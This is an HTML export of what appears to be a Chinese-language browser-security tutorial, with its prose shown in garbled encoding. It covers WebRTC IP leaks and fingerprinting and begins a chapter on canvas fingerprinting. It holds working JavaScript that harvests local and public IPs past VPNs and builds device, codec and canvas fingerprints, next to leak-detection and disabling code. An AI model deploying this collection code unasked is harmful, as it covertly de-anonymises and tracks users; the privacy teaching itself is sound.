<h2>è¿›é˜¶é˜…è¯»</h2>
<h3>å®˜æ–¹æ–‡æ¡£</h3>
<ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">MDN Content Security Policy</a></li>
<li><a href="https://www.w3.org/TR/CSP3/">W3C CSP Level 3 è§„èŒƒ</a></li>
<li><a href="https://developers.google.com/web/fundamentals/security/csp">Google Web Fundamentals - CSP</a></li>
</ul>
<h3>å®‰å…¨ç ”ç©¶</h3>
<ul>
<li><a href="https://research.google/pubs/pub45542/">CSP Is Dead, Long Live CSP!</a> - Google ç ”ç©¶</li>
<li><a href="https://github.com/PortSwigger/csp-bypass">CSP Bypasses é›†åˆ</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html">Content Security Policy Cheat Sheet</a> - OWASP</li>
</ul>
<h3>å·¥å…·</h3>
<ul>
<li><a href="https://csp-evaluator.withgoogle.com/">CSP Evaluator</a></li>
<li><a href="https://report-uri.com/">Report URI</a> - CSP æŠ¥å‘Šæ”¶é›†</li>
<li><a href="https://github.com/mozilla/http-observatory">CSP Scanner</a></li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li>XSS æ¼æ´åˆ©ç”¨</li>
<li>æµè§ˆå™¨å®‰å…¨æœºåˆ¶</li>
<li>HTTP å®‰å…¨å¤´éƒ¨</li>
<li>DOM XSS æ£€æµ‹</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-40">
                                                <h2>[R39] WebRTC Fingerprinting</h2>
                                                <h1>R39: WebRTC æŒ‡çº¹ä¸éšç§</h1>
<h2>æ¦‚è¿°</h2>
<p>WebRTC (Web Real-Time Communication) æ˜¯ä¸€ç§æ”¯æŒç½‘é¡µæµè§ˆå™¨è¿›è¡Œå®æ—¶è¯­éŸ³ã€è§†é¢‘é€šä¿¡å’Œæ•°æ®å…±äº«çš„æŠ€æœ¯ã€‚ç„¶è€Œï¼ŒWebRTC ä¹Ÿå¯èƒ½æ³„éœ²ç”¨æˆ·çš„çœŸå® IP åœ°å€å’Œå…¶ä»–è®¾å¤‡ä¿¡æ¯ï¼Œæˆä¸ºæŒ‡çº¹è¯†åˆ«å’Œéšç§æ³„éœ²çš„é‡è¦é€”å¾„ã€‚</p>
<hr />
<h2>åŸºç¡€æ¦‚å¿µ</h2>
<h3>å®šä¹‰</h3>
<p><strong>WebRTC</strong> æ˜¯ä¸€ç»„æ ‡å‡†åŒ–çš„ APIï¼Œå…è®¸æµè§ˆå™¨å’Œç§»åŠ¨åº”ç”¨ç¨‹åºè¿›è¡Œç‚¹å¯¹ç‚¹çš„å®æ—¶é€šä¿¡ï¼Œæ— éœ€å®‰è£…æ’ä»¶æˆ–ç¬¬ä¸‰æ–¹è½¯ä»¶ã€‚</p>
<p><strong>ä¸»è¦ç»„ä»¶</strong>:</p>
<ul>
<li><strong>getUserMedia</strong>: è®¿é—®æ‘„åƒå¤´å’Œéº¦å…‹é£</li>
<li><strong>RTCPeerConnection</strong>: å»ºç«‹ç‚¹å¯¹ç‚¹éŸ³è§†é¢‘é€šä¿¡</li>
<li><strong>RTCDataChannel</strong>: ç‚¹å¯¹ç‚¹æ•°æ®ä¼ è¾“</li>
</ul>
<p><strong>éšç§é£é™©</strong>:</p>
<ul>
<li>æ³„éœ²çœŸå® IP åœ°å€ï¼ˆç»•è¿‡ VPN/ä»£ç†ï¼‰</li>
<li>æ”¶é›†è®¾å¤‡æŒ‡çº¹ä¿¡æ¯</li>
<li>è·å–æœ¬åœ°ç½‘ç»œæ‹“æ‰‘</li>
<li>æš´éœ²åª’ä½“è®¾å¤‡ä¿¡æ¯</li>
</ul>
<h3>æ ¸å¿ƒåŸç†</h3>
<h4>WebRTC è¿æ¥å»ºç«‹è¿‡ç¨‹</h4>
<pre><code>å®¢æˆ·ç«¯ A                                   å®¢æˆ·ç«¯ B
    |                                          |
    |-- 1. åˆ›å»º RTCPeerConnection -----------&gt;|
    |                                          |
    |-- 2. æ”¶é›† ICE Candidates ---------------&gt;|
    |    (åŒ…å«æœ¬åœ°/å…¬ç½‘ IP)                     |
    |                                          |
    |&lt;- 3. äº¤æ¢ SDP Offer/Answer --------------|
    |                                          |
    |-- 4. å»ºç«‹ç‚¹å¯¹ç‚¹è¿æ¥ --------------------&gt;|
    |                                          |
    |&lt;======= 5. å®æ—¶é€šä¿¡ =====================&gt;|
</code></pre>
<h4>ICE (Interactive Connectivity Establishment)</h4>
<p>WebRTC ä½¿ç”¨ ICE åè®®æ”¶é›†å€™é€‰è¿æ¥è·¯å¾„ï¼š</p>
<ul>
<li><strong>Host Candidate</strong>: æœ¬åœ° IP åœ°å€ï¼ˆå±€åŸŸç½‘ IPï¼‰</li>
<li><strong>Server Reflexive Candidate</strong>: å…¬ç½‘ IPï¼ˆé€šè¿‡ STUN æœåŠ¡å™¨è·å–ï¼‰</li>
<li><strong>Relay Candidate</strong>: ä¸­ç»§ IPï¼ˆé€šè¿‡ TURN æœåŠ¡å™¨ï¼‰</li>
</ul>
<p>è¿™äº›ä¿¡æ¯å¯ä»¥è¢« JavaScript è®¿é—®ï¼Œå¯¼è‡´ IP æ³„éœ²ã€‚</p>
<hr />
<h2>è¯¦ç»†å†…å®¹</h2>
<h3>IP åœ°å€æ³„éœ²</h3>
<h4>1. <strong>æœ¬åœ° IP æ³„éœ²</strong></h4>
<p>å³ä½¿ç”¨æˆ·ä½¿ç”¨ VPNï¼ŒWebRTC ä»å¯èƒ½æ³„éœ²çœŸå®çš„æœ¬åœ° IPã€‚</p>
<p><strong>æ³„éœ²æœºåˆ¶</strong>:</p>
<pre><code class="language-javascript">// åˆ›å»º RTCPeerConnection
const pc = new RTCPeerConnection({
  iceServers: [{ urls: &quot;stun:stun.l.google.com:19302&quot; }],
});

// åˆ›å»ºè™šæ‹Ÿæ•°æ®é€šé“
pc.createDataChannel(&quot;&quot;);

// åˆ›å»º Offer
pc.createOffer().then((offer) =&gt; pc.setLocalDescription(offer));

// ç›‘å¬ ICE å€™é€‰
pc.onicecandidate = (ice) =&gt; {
  if (ice &amp;&amp; ice.candidate &amp;&amp; ice.candidate.candidate) {
    const candidate = ice.candidate.candidate;
    console.log(&quot;ICE Candidate:&quot;, candidate);

    // è§£æ IP åœ°å€
    const ipRegex =
      /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
    const match = candidate.match(ipRegex);
    if (match) {
      console.log(&quot;Leaked IP:&quot;, match[1]);
    }
  }
};
</code></pre>
<p><strong>æ³„éœ²çš„ä¿¡æ¯</strong>:</p>
<ul>
<li>å†…ç½‘ IPv4 åœ°å€ (192.168.x.x, 10.x.x.x)</li>
<li>å†…ç½‘ IPv6 åœ°å€</li>
<li>å…¬ç½‘ IPv4/IPv6 åœ°å€</li>
<li>mDNS å€™é€‰ï¼ˆæŸäº›æµè§ˆå™¨ï¼‰</li>
</ul>
<h4>2. <strong>å…¬ç½‘ IP æ³„éœ²</strong></h4>
<p>é€šè¿‡ STUN æœåŠ¡å™¨è·å–ç”¨æˆ·çš„çœŸå®å…¬ç½‘ IPï¼Œç»•è¿‡ VPN/ä»£ç†ã€‚</p>
<p><strong>å®Œæ•´ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">function getIPs(callback) {
  const ips = [];
  const pc = new RTCPeerConnection({
    iceServers: [
      { urls: &quot;stun:stun.l.google.com:19302&quot; },
      { urls: &quot;stun:stun1.l.google.com:19302&quot; },
    ],
  });

  pc.createDataChannel(&quot;&quot;);
  pc.createOffer().then((offer) =&gt; pc.setLocalDescription(offer));

  pc.onicecandidate = (ice) =&gt; {
    if (!ice || !ice.candidate || !ice.candidate.candidate) {
      return;
    }

    const candidate = ice.candidate.candidate;
    const ipRegex =
      /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
    const match = candidate.match(ipRegex);

    if (match &amp;&amp; !ips.includes(match[1])) {
      ips.push(match[1]);
      callback(match[1], candidate);
    }
  };
}

// ä½¿ç”¨
getIPs((ip, candidate) =&gt; {
  console.log(&quot;IP:&quot;, ip);
  console.log(
    &quot;Type:&quot;,
    candidate.includes(&quot;typ host&quot;)
      ? &quot;Local&quot;
      : candidate.includes(&quot;typ srflx&quot;)
      ? &quot;Public&quot;
      : &quot;Relay&quot;
  );
});
</code></pre>
<h3>è®¾å¤‡æŒ‡çº¹ä¿¡æ¯</h3>
<h4>1. <strong>åª’ä½“è®¾å¤‡æšä¸¾</strong></h4>
<p>WebRTC å¯ä»¥æšä¸¾ç”¨æˆ·çš„éŸ³è§†é¢‘è®¾å¤‡ï¼š</p>
<pre><code class="language-javascript">navigator.mediaDevices.enumerateDevices().then((devices) =&gt; {
  devices.forEach((device) =&gt; {
    console.log({
      kind: device.kind, // &quot;audioinput&quot;, &quot;videoinput&quot;, &quot;audiooutput&quot;
      label: device.label, // è®¾å¤‡åç§°
      deviceId: device.deviceId, // å”¯ä¸€æ ‡è¯†ç¬¦
      groupId: device.groupId, // è®¾å¤‡ç»„
    });
  });
});
</code></pre>
<p><strong>æŒ‡çº¹ç”¨é€”</strong>:</p>
<ul>
<li><code>deviceId</code> å¯ä½œä¸ºæŒä¹…åŒ–æ ‡è¯†ç¬¦</li>
<li>è®¾å¤‡æ•°é‡å’Œç±»å‹ç»„åˆå½¢æˆç‹¬ç‰¹æŒ‡çº¹</li>
<li>è®¾å¤‡åç§°å¯èƒ½æš´éœ²ç¡¬ä»¶ä¿¡æ¯</li>
</ul>
<h4>2. <strong>ç¼–è§£ç å™¨æ”¯æŒ</strong></h4>
<p>ä¸åŒè®¾å¤‡æ”¯æŒä¸åŒçš„éŸ³è§†é¢‘ç¼–è§£ç å™¨ï¼š</p>
<pre><code class="language-javascript">const pc = new RTCPeerConnection();

pc.createOffer().then((offer) =&gt; {
  const codecs = [];

  // è§£æ SDP è·å–æ”¯æŒçš„ç¼–è§£ç å™¨
  offer.sdp.split(&quot;\r\n&quot;).forEach((line) =&gt; {
    if (line.startsWith(&quot;a=rtpmap:&quot;)) {
      codecs.push(line);
    }
  });

  console.log(&quot;Supported codecs:&quot;, codecs);
});
</code></pre>
<h4>3. <strong>RTC ç»Ÿè®¡ä¿¡æ¯</strong></h4>
<pre><code class="language-javascript">const pc = new RTCPeerConnection();

pc.getStats().then((stats) =&gt; {
  stats.forEach((report) =&gt; {
    console.log({
      type: report.type,
      id: report.id,
      timestamp: report.timestamp,
      ...report,
    });
  });
});
</code></pre>
<p><strong>å¯è·å–çš„ä¿¡æ¯</strong>:</p>
<ul>
<li>ç½‘ç»œè´¨é‡æŒ‡æ ‡</li>
<li>ä¼ è¾“ç»Ÿè®¡</li>
<li>ç¼–è§£ç å™¨æ€§èƒ½</li>
<li>ç¡¬ä»¶åŠ é€Ÿèƒ½åŠ›</li>
</ul>
<h3>éšç§ä¿æŠ¤æ£€æµ‹</h3>
<h4>æ£€æµ‹ WebRTC æ³„éœ²</h4>
<pre><code class="language-javascript">async function detectWebRTCLeak() {
  const results = {
    localIPs: [],
    publicIPs: [],
    devices: [],
    leakDetected: false,
  };

  // 1. æ£€æµ‹ IP æ³„éœ²
  const pc = new RTCPeerConnection({
    iceServers: [{ urls: &quot;stun:stun.l.google.com:19302&quot; }],
  });

  pc.createDataChannel(&quot;&quot;);
  pc.createOffer().then((offer) =&gt; pc.setLocalDescription(offer));

  await new Promise((resolve) =&gt; {
    pc.onicecandidate = (ice) =&gt; {
      if (!ice || !ice.candidate) {
        resolve();
        return;
      }

      const candidate = ice.candidate.candidate;
      const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);

      if (ipMatch) {
        const ip = ipMatch[0];
        if (
          ip.startsWith(&quot;192.168.&quot;) ||
          ip.startsWith(&quot;10.&quot;) ||
          ip.startsWith(&quot;172.&quot;)
        ) {
          results.localIPs.push(ip);
        } else {
          results.publicIPs.push(ip);
          results.leakDetected = true;
        }
      }
    };

    setTimeout(resolve, 2000);
  });

  // 2. æ£€æµ‹è®¾å¤‡æšä¸¾
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    results.devices = devices.map((d) =&gt; ({
      kind: d.kind,
      label: d.label,
      hasId: !!d.deviceId,
    }));
  } catch (e) {
    console.log(&quot;Device enumeration blocked&quot;);
  }

  return results;
}

// ä½¿ç”¨
detectWebRTCLeak().then((results) =&gt; {
  console.log(&quot;WebRTC Leak Detection Results:&quot;, results);
  if (results.leakDetected) {
    console.warn(&quot;âš ï¸ WebRTC IP leak detected!&quot;);
  }
});
</code></pre>
<hr />
<h2>å®æˆ˜ç¤ºä¾‹</h2>
<h3>ç¤ºä¾‹ 1: å®Œæ•´çš„ IP æ³„éœ²æ£€æµ‹å·¥å…·</h3>
<pre><code class="language-javascript">class WebRTCLeakDetector {
  constructor() {
    this.ips = new Set();
    this.candidates = [];
  }

  async detect() {
    return new Promise((resolve) =&gt; {
      const pc = new RTCPeerConnection({
        iceServers: [
          { urls: &quot;stun:stun.l.google.com:19302&quot; },
          { urls: &quot;stun:stun1.l.google.com:19302&quot; },
          { urls: &quot;stun:stun.services.mozilla.com&quot; },
        ],
      });

      pc.createDataChannel(&quot;leak-test&quot;);
      pc.createOffer()
        .then((offer) =&gt; pc.setLocalDescription(offer))
        .catch((err) =&gt; console.error(err));

      pc.onicecandidate = (event) =&gt; {
        if (!event || !event.candidate) {
          pc.close();
          resolve(this.generateReport());
          return;
        }

        this.processCandidate(event.candidate);
      };

      // è¶…æ—¶ä¿æŠ¤
      setTimeout(() =&gt; {
        pc.close();
        resolve(this.generateReport());
      }, 5000);
    });
  }

  processCandidate(candidate) {
    this.candidates.push(candidate.candidate);

    const parts = candidate.candidate.split(&quot; &quot;);
    const ip = parts[4];
    const type = parts[7];

    if (ip &amp;&amp; this.isValidIP(ip)) {
      this.ips.add(ip);
      console.log(`Found ${type} IP: ${ip}`);
    }
  }

  isValidIP(str) {
    // IPv4
    const ipv4 = /^(\d{1,3}\.){3}\d{1,3}$/;
    // IPv6
    const ipv6 = /^([\da-f]{1,4}:){7}[\da-f]{1,4}$/i;

    return ipv4.test(str) || ipv6.test(str);
  }

  generateReport() {
    const report = {
      ips: Array.from(this.ips),
      local: [],
      public: [],
      ipv6: [],
      candidates: this.candidates,
    };

    report.ips.forEach((ip) =&gt; {
      if (ip.includes(&quot;:&quot;)) {
        report.ipv6.push(ip);
      } else if (this.isLocalIP(ip)) {
        report.local.push(ip);
      } else {
        report.public.push(ip);
      }
    });

    return report;
  }

  isLocalIP(ip) {
    return (
      ip.startsWith(&quot;192.168.&quot;) ||
      ip.startsWith(&quot;10.&quot;) ||
      ip.match(/^172\.(1[6-9]|2\d|3[01])\./)
    );
  }
}

// ä½¿ç”¨
const detector = new WebRTCLeakDetector();
detector.detect().then((report) =&gt; {
  console.log(&quot;=== WebRTC Leak Report ===&quot;);
  console.log(&quot;Local IPs:&quot;, report.local);
  console.log(&quot;Public IPs:&quot;, report.public);
  console.log(&quot;IPv6:&quot;, report.ipv6);

  if (report.public.length &gt; 0) {
    console.warn(&quot;âš ï¸ Public IP leak detected!&quot;);
  }
});
</code></pre>
<h3>ç¤ºä¾‹ 2: ç¦ç”¨ WebRTC</h3>
<pre><code class="language-javascript">// æ–¹æ³•1: è¦†ç›– RTCPeerConnection (ä¸æ¨èï¼Œå¯èƒ½ç ´ååŠŸèƒ½)
(function () {
  &quot;use strict&quot;;

  const noop = function () {};
  const noopPromise = function () {
    return Promise.resolve();
  };

  window.RTCPeerConnection = function () {
    return {
      createOffer: noopPromise,
      createAnswer: noopPromise,
      setLocalDescription: noopPromise,
      setRemoteDescription: noopPromise,
      close: noop,
      addEventListener: noop,
    };
  };

  console.log(&quot;WebRTC has been disabled&quot;);
})();

// æ–¹æ³•2: æµè§ˆå™¨è®¾ç½®
// Chrome: chrome://flags/#enable-webrtc-hide-local-ips-with-mdns
// Firefox: media.peerconnection.enabled = false

// æ–¹æ³•3: æµè§ˆå™¨æ‰©å±•
// - WebRTC Leak Prevent (Chrome)
// - Disable WebRTC (Firefox)
</code></pre>
<h3>ç¤ºä¾‹ 3: è®¾å¤‡æŒ‡çº¹é‡‡é›†</h3>
<pre><code class="language-javascript">async function collectWebRTCFingerprint() {
  const fingerprint = {};

  // 1. åª’ä½“è®¾å¤‡
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    fingerprint.devices = devices.map((d) =&gt; ({
      kind: d.kind,
      id: d.deviceId,
      groupId: d.groupId,
    }));
    fingerprint.deviceCount = {
      audioinput: devices.filter((d) =&gt; d.kind === &quot;audioinput&quot;).length,
      videoinput: devices.filter((d) =&gt; d.kind === &quot;videoinput&quot;).length,
      audiooutput: devices.filter((d) =&gt; d.kind === &quot;audiooutput&quot;).length,
    };
  } catch (e) {
    fingerprint.devices = &quot;blocked&quot;;
  }

  // 2. æ”¯æŒçš„ç¼–è§£ç å™¨
  const pc = new RTCPeerConnection();
  const offer = await pc.createOffer({
    offerToReceiveAudio: true,
    offerToReceiveVideo: true,
  });

  fingerprint.codecs = {
    audio: [],
    video: [],
  };

  offer.sdp.split(&quot;\r\n&quot;).forEach((line) =&gt; {
    if (line.startsWith(&quot;a=rtpmap:&quot;)) {
      const codec = line.split(&quot; &quot;)[1];
      if (line.includes(&quot;audio&quot;)) {
        fingerprint.codecs.audio.push(codec);
      } else if (line.includes(&quot;video&quot;)) {
        fingerprint.codecs.video.push(codec);
      }
    }
  });

  pc.close();

  // 3. RTC èƒ½åŠ›
  fingerprint.capabilities = {
    audio: RTCRtpSender.getCapabilities
      ? RTCRtpSender.getCapabilities(&quot;audio&quot;)
      : null,
    video: RTCRtpSender.getCapabilities
      ? RTCRtpSender.getCapabilities(&quot;video&quot;)
      : null,
  };

  return fingerprint;
}

// ä½¿ç”¨
collectWebRTCFingerprint().then((fp) =&gt; {
  console.log(&quot;WebRTC Fingerprint:&quot;, fp);

  // è®¡ç®—æŒ‡çº¹å“ˆå¸Œ
  const fpString = JSON.stringify(fp);
  console.log(&quot;Fingerprint hash:&quot;, hashCode(fpString));
});

function hashCode(str) {
  let hash = 0;
  for (let i = 0; i &lt; str.length; i++) {
    const char = str.charCodeAt(i);
    hash = (hash &lt;&lt; 5) - hash + char;
    hash = hash &amp; hash;
  }
  return hash.toString(16);
}
</code></pre>
<hr />
<h2>æœ€ä½³å®è·µ</h2>
<h3>ç”¨æˆ·éšç§ä¿æŠ¤</h3>
<ol>
<li><p><strong>ä½¿ç”¨æµè§ˆå™¨æ‰©å±•</strong></p>
<ul>
<li>WebRTC Leak Prevent</li>
<li>uBlock Origin (å¯ç”¨éšç§è¿‡æ»¤)</li>
<li>Privacy Badger</li>
</ul>
</li>
<li><p><strong>æµè§ˆå™¨è®¾ç½®</strong></p>
<p><strong>Firefox</strong>:</p>
<ul>
<li><code>about:config</code> â†’ <code>media.peerconnection.enabled</code> = <code>false</code></li>
<li><code>media.peerconnection.ice.default_address_only</code> = <code>true</code></li>
<li><code>media.peerconnection.ice.no_host</code> = <code>true</code></li>
</ul>
<p><strong>Chrome</strong>:</p>
<ul>
<li><code>chrome://flags/#enable-webrtc-hide-local-ips-with-mdns</code> å¯ç”¨</li>
<li>ä½¿ç”¨æ‰©å±•ç¨‹åº</li>
</ul>
</li>
<li><p><strong>VPN é…ç½®</strong></p>
<ul>
<li>ç¡®ä¿ VPN æ”¯æŒ WebRTC ä¿æŠ¤</li>
<li>å¯ç”¨ VPN çš„ IPv6 æ³„éœ²é˜²æŠ¤</li>
<li>æµ‹è¯• VPN æ˜¯å¦çœŸæ­£é˜»æ­¢ WebRTC æ³„éœ²</li>
</ul>
</li>
<li><p><strong>å®šæœŸæ£€æµ‹</strong></p>
<ul>
<li>è®¿é—® https://browserleaks.com/webrtc</li>
<li>ä½¿ç”¨ https://ipleak.net</li>
<li>è‡ªå®šä¹‰æ£€æµ‹è„šæœ¬</li>
</ul>
</li>
</ol>
<h3>ç½‘ç«™å¼€å‘è€…</h3>
<ol>
<li><p><strong>æœ€å°æƒé™åŸåˆ™</strong></p>
<ul>
<li>ä»…åœ¨å¿…è¦æ—¶è¯·æ±‚åª’ä½“æƒé™</li>
<li>æ˜ç¡®å‘ŠçŸ¥ç”¨æˆ·ä¸ºä½•éœ€è¦ WebRTC</li>
</ul>
</li>
<li><p><strong>éšç§å£°æ˜</strong></p>
<ul>
<li>è¯´æ˜å¦‚ä½•ä½¿ç”¨ WebRTC</li>
<li>å‘ŠçŸ¥å¯èƒ½æ”¶é›†çš„ä¿¡æ¯</li>
</ul>
</li>
<li><p><strong>æä¾›æ§åˆ¶é€‰é¡¹</strong></p>
<ul>
<li>å…è®¸ç”¨æˆ·ç¦ç”¨ WebRTC åŠŸèƒ½</li>
<li>æä¾›æ›¿ä»£æ–¹æ¡ˆ</li>
</ul>
</li>
</ol>
<hr />
<h2>å¸¸è§é—®é¢˜</h2>
<h3>Q: VPN èƒ½é˜²æ­¢ WebRTC æ³„éœ²å—ï¼Ÿ</h3>
<p><strong>A</strong>: ä¸ä¸€å®šã€‚WebRTC å¯ä»¥ç»•è¿‡ VPN ç›´æ¥æ³„éœ²æœ¬åœ°å’Œå…¬ç½‘ IPï¼š</p>
<ul>
<li><strong>æœ¬åœ° IP</strong>: VPN æ— æ³•éšè—ï¼ˆ192.168.x.xï¼‰</li>
<li><strong>å…¬ç½‘ IP</strong>: å¯èƒ½ç»•è¿‡ VPN éš§é“æ³„éœ²çœŸå® IP</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>: ç¦ç”¨ WebRTC æˆ–ä½¿ç”¨æ”¯æŒ WebRTC ä¿æŠ¤çš„ VPN</li>
</ul>
<h3>Q: ä¸ºä»€ä¹ˆæµè§ˆå™¨å…è®¸ WebRTC æ³„éœ² IPï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<ul>
<li>WebRTC è®¾è®¡ç”¨äºç‚¹å¯¹ç‚¹é€šä¿¡ï¼Œéœ€è¦çœŸå® IP å»ºç«‹è¿æ¥</li>
<li>è¿™æ˜¯åŠŸèƒ½éœ€æ±‚ï¼Œä¸æ˜¯å®‰å…¨æ¼æ´</li>
<li>æµè§ˆå™¨é€æ­¥å¢å¼ºéšç§ä¿æŠ¤ï¼ˆå¦‚ mDNSï¼‰</li>
</ul>
<h3>Q: mDNS æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•ä¿æŠ¤éšç§ï¼Ÿ</h3>
<p><strong>A</strong>:
<strong>mDNS</strong> (Multicast DNS) æ˜¯ä¸€ç§éšç§ä¿æŠ¤æœºåˆ¶ï¼š</p>
<ul>
<li>ç”¨éšæœº <code>.local</code> åœ°å€æ›¿ä»£çœŸå®æœ¬åœ° IP</li>
<li>Chrome å’Œ Safari é»˜è®¤å¯ç”¨</li>
<li>Firefox éœ€è¦æ‰‹åŠ¨é…ç½®</li>
</ul>
<p>ç¤ºä¾‹ï¼š<code>a1b2c3d4.local</code> è€Œä¸æ˜¯ <code>192.168.1.100</code></p>
<h3>Q: å¦‚ä½•æ£€æµ‹ç½‘ç«™æ˜¯å¦åœ¨æ”¶é›† WebRTC æŒ‡çº¹ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<ol>
<li>æ‰“å¼€æµè§ˆå™¨å¼€å‘è€…å·¥å…·</li>
<li>åœ¨ Console ä¸­è¿è¡Œï¼š<pre><code class="language-javascript">RTCPeerConnection.prototype._createOffer =
  RTCPeerConnection.prototype.createOffer;
RTCPeerConnection.prototype.createOffer = function () {
  console.trace(&quot;WebRTC createOffer called&quot;);
  return this._createOffer.apply(this, arguments);
};
</code></pre>
</li>
<li>æŸ¥çœ‹æ˜¯å¦æœ‰ WebRTC è°ƒç”¨çš„å †æ ˆè¿½è¸ª</li>
</ol>
<hr />
<h2>è¿›é˜¶é˜…è¯»</h2>
<h3>å®˜æ–¹æ–‡æ¡£</h3>
<ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WebRTC_API">WebRTC API - MDN</a></li>
<li><a href="https://www.w3.org/TR/webrtc/">WebRTC è§„èŒƒ</a></li>
<li><a href="https://tools.ietf.org/html/rfc5245">ICE åè®® RFC 5245</a></li>
</ul>
<h3>éšç§ç ”ç©¶</h3>
<ul>
<li><a href="https://research.checkpoint.com/webrtc-vulnerability/">WebRTC IP Leak Vulnerability</a></li>
<li><a href="https://arxiv.org/abs/1906.02159">Browser Fingerprinting via WebRTC</a></li>
<li><a href="https://tools.ietf.org/html/draft-ietf-rtcweb-security">WebRTC Privacy and Security Considerations</a></li>
</ul>
<h3>æ£€æµ‹å·¥å…·</h3>
<ul>
<li><a href="https://browserleaks.com/webrtc">BrowserLeaks WebRTC Test</a></li>
<li><a href="https://ipleak.net/">IPLeak.net</a></li>
<li><a href="https://www.perfect-privacy.com/en/tests/check-ip">Perfect Privacy Check IP</a></li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-41">Canvas æŒ‡çº¹è¯†åˆ«</a></li>
<li><a href="#section-42">TLS æŒ‡çº¹è¯†åˆ«</a></li>
<li><a href="#section-34">æµè§ˆå™¨æŒ‡çº¹æŠ€æœ¯</a></li>
<li>éšç§ä¿æŠ¤æŠ€æœ¯</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-41">
                                                <h2>[R40] Canvas Fingerprinting</h2>
                                                <h1>R40: Canvas æŒ‡çº¹æŠ€æœ¯</h1>
<h2>ğŸ’­ æ€è€ƒæ—¶åˆ»</h2>
<p>åœ¨å­¦ä¹  Canvas æŒ‡çº¹ä¹‹å‰ï¼Œå…ˆæ€è€ƒï¼š</p>
<ol>
<li><strong>ä¸ºä»€ä¹ˆ Cookie å’Œ IP åœ°å€ä¸å¤Ÿç”¨ï¼Ÿ</strong> ä¸ºä»€ä¹ˆç½‘ç«™è¿˜éœ€è¦æŒ‡çº¹è¯†åˆ«ï¼Ÿ</li>
<li><strong>ä½ çš„æµè§ˆå™¨æ˜¯ç‹¬ä¸€æ— äºŒçš„å—ï¼Ÿ</strong> å³ä½¿ä½ æ¢äº† IPã€æ¸…ç©ºäº† Cookieï¼Œç½‘ç«™è¿˜èƒ½è®¤å‡ºä½ å—ï¼Ÿ</li>
<li><strong>ç”»å¸ƒæŒ‡çº¹çš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ</strong> ä¸ºä»€ä¹ˆåœ¨åŒä¸€ä¸ª Canvas ä¸Šç”»åŒæ ·çš„ä¸œè¥¿ï¼Œä¸åŒç”µè„‘ä¼šäº§ç”Ÿä¸åŒçš„ç»“æœï¼Ÿ</li>
<li><strong>å®æˆ˜åœºæ™¯ï¼š</strong> æŸç”µå•†ç½‘ç«™é™åˆ¶æ¯ä¸ªç”¨æˆ·åªèƒ½æŠ¢è´­ä¸€ä»¶å•†å“ï¼Œä½ æ¢äº†æµè§ˆå™¨ã€æ¸…ç©ºäº†ç¼“å­˜ã€ä½¿ç”¨äº†ä»£ç†ï¼Œä¸ºä»€ä¹ˆè¿˜æ˜¯è¢«è¯†åˆ«å‡ºæ¥äº†ï¼Ÿ</li>
</ol>
<p>è¿™äº›é—®é¢˜çš„ç­”æ¡ˆï¼Œè—åœ¨æµè§ˆå™¨çš„æ¸²æŸ“å¼•æ“é‡Œã€‚</p>
<hr />
<h2>æ¦‚è¿°</h2>
<p>Canvas Fingerprinting æ˜¯ä¸€ç§é€šè¿‡ HTML5 Canvas API ç”Ÿæˆæµè§ˆå™¨æŒ‡çº¹çš„æŠ€æœ¯ã€‚ç”±äºä¸åŒç³»ç»Ÿã€æµè§ˆå™¨ã€æ˜¾å¡æ¸²æŸ“æ–‡æœ¬å’Œå›¾å½¢æ—¶å­˜åœ¨ç»†å¾®å·®å¼‚ï¼Œè¿™äº›å·®å¼‚å¯ä»¥ç”¨æ¥å”¯ä¸€æ ‡è¯†ç”¨æˆ·ã€‚</p>
<hr />
<h2>åŸç†</h2>
<h3>1. æ¸²æŸ“å·®å¼‚æ¥æº</h3>
<p><strong>ç¡¬ä»¶å±‚é¢</strong>:</p>
<ul>
<li>GPU å‹å·å’Œé©±åŠ¨ç‰ˆæœ¬</li>
<li>æ“ä½œç³»ç»Ÿï¼ˆWindows/Mac/Linuxï¼‰</li>
<li>å­—ä½“æ¸²æŸ“å¼•æ“ï¼ˆDirectWrite/CoreText/FreeTypeï¼‰</li>
</ul>
<p><strong>è½¯ä»¶å±‚é¢</strong>:</p>
<ul>
<li>æµè§ˆå™¨ç±»å‹å’Œç‰ˆæœ¬</li>
<li>å·²å®‰è£…çš„å­—ä½“</li>
<li>å›¾åƒå‹ç¼©ç®—æ³•</li>
</ul>
<h3>2. ç”Ÿæˆæµç¨‹</h3>
<pre><code class="language-javascript">// 1. åˆ›å»º Canvas
const canvas = document.createElement(&quot;canvas&quot;);
const ctx = canvas.getContext(&quot;2d&quot;);

// 2. ç»˜åˆ¶ç‰¹å®šå†…å®¹
ctx.textBaseline = &quot;top&quot;;
ctx.font = &quot;14px Arial&quot;;
ctx.textBaseline = &quot;alphabetic&quot;;
ctx.fillStyle = &quot;#f60&quot;;
ctx.fillRect(125, 1, 62, 20);
ctx.fillStyle = &quot;#069&quot;;
ctx.fillText(&quot;Hello, world!&quot;, 2, 15);
ctx.fillStyle = &quot;rgba(102, 204, 0, 0.7)&quot;;
ctx.fillText(&quot;Hello, world!&quot;, 4, 17);

// 3. å¯¼å‡ºä¸ºå›¾åƒæ•°æ®
const dataURL = canvas.toDataURL();

// 4. è®¡ç®—å“ˆå¸Œä½œä¸ºæŒ‡çº¹
const fingerprint = md5(dataURL);
</code></pre>
